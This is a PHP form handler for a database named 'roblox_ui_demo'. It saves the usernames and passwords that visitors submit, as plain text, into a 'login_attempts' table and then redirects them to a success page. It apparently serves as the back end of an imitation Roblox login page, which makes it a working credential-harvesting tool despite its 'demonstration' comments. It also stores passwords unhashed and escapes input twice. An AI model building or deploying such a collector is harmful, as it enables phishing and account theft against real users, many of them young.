<?php

// Database configuration (default XAMPP settings)
$servername = "localhost";
$username = "root"; // Default XAMPP MySQL user
$password = "";     // Default XAMPP MySQL password (empty)
$dbname = "roblox_ui_demo"; // The database name we created

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    // Stop script execution and display error if connection fails
    die("Connection failed: " . $conn->connect_error);
}

// Check if the request method is POST and the fields are set
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['user_input']) && isset($_POST['password_input'])) {
    
    // 1. Get and Sanitize Input
    // Use $conn->real_escape_string to escape special characters, 
    // which helps prevent SQL injection (though prepared statements are better)
    $userInput = $conn->real_escape_string($_POST['user_input']);
    $passwordInput = $conn->real_escape_string($_POST['password_input']);
    
    // Note: Do NOT store raw passwords in a real application. This is for demonstration.
    
    // 2. Prepare SQL statement using a prepared statement (BEST practice for security)
    $sql = "INSERT INTO login_attempts (user_input, password_input) VALUES (?, ?)";
    
    $stmt = $conn->prepare($sql);
    
    // 3. Bind parameters and execute
    // "ss" means both parameters are strings
    $stmt->bind_param("ss", $userInput, $passwordInput);
    
    if ($stmt->execute()) {
        // Successful insert, redirect the user back or to a confirmation page
        header("Location: index.html?status=success");
        exit();
    } else {
        echo "Error: " . $stmt->error;
    }

    // 4. Close statement and connection
    $stmt->close();

} else {
    // If someone tries to access this page directly without POSTing form data
    echo "Access denied. Please submit the form.";
}

$conn->close();

?>